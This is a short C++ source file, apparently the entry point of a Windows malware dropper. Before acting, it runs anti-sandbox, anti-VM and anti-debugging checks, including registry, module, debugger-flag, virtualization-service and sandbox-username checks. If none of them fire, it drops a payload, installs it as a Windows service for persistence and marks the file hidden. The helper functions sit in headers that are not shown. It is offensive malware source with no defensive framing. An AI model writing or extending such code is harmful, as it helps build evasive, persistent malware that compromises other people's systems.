//
// Created by bowen on 2023/11/28.
//

#include "createService.h"
#include "dropPayload.h"
#include "anti.h"

int main(int argc, char** argv) {
    /*
     * Anti sandbox, anti VM and anti debugging.
     * */
    if (
            checkReg() ||
            enumWindows() ||
            checkModules() ||
            isDebuggerPresentApi() ||
            checkNtGlobalFlag() ||
            isVirtualizationServicePresent() ||
            checkSandboxUsername()
            )
        return -1;
    std::wstring filePath = dropPayload();
    InstallService(filePath);
    SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return 0;
}
